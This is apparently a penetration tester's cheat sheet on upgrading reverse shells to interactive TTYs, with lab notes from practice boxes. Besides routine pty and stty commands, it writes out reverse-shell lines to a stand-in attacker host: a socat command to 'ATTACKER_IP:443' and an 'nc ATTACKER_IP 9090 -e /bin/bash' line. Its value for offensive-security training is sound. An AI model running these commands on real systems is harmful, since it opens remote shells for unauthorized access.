# TTY Upgrades

**Always upgrade your shell immediately after getting one.**

---

## Python (most common)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then:
```
Ctrl+Z
```
```bash
stty raw -echo; fg
```
Then:
```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
```

## script (if no Python)
```bash
script -qc /bin/bash /dev/null
```
Then Ctrl+Z, `stty raw -echo; fg`

## rlwrap (use BEFORE catching shell)
```bash
rlwrap nc -lvnp 443
```
Gives you arrow keys and history immediately.

## socat (best quality shell)
```bash
# Kali listener:
socat file:`tty`,raw,echo=0 tcp-listen:443

# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:443
```
If socat not on target, upload the static binary first via [[File-Transfers]].

---

## Windows

Windows shells don't need TTY upgrades in the same way. Use:
- Evil-WinRM (gives you a nice PowerShell prompt)
- ConPtyShell for a fully interactive Windows shell
- rlwrap on your listener for basic readline

## From Your Boxes

> **Pelican** (PG/Linux) — Used `script /dev/null` for TTY upgrade when Python wasn't the first choice
> - What worked: `script /dev/null -c /bin/bash` after catching reverse shell via nc
> - Lesson: `script /dev/null` is a solid alternative to Python pty spawn. Works on systems where python3 path is non-standard

> **Cockpit** (PG/Linux) — Same `script /dev/null` pattern after getting shell through custom nc binary
> - What worked: `script /dev/null -c /bin/bash` immediately after `./nc ATTACKER_IP 9090 -e /bin/bash` connected
> - Lesson: Always upgrade immediately — you need a real TTY for `sudo -l`, password prompts, and tab completion

> **Course Materials** (SSH tunneling notes) — Every SSH tunnel guide starts with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
> - What worked: Spawning PTY was required before SSH dynamic/remote forwarding would work properly from a reverse shell
> - Lesson: SSH commands from a reverse shell REQUIRE a PTY. If you skip the upgrade, SSH will fail with "Pseudo-terminal will not be allocated"
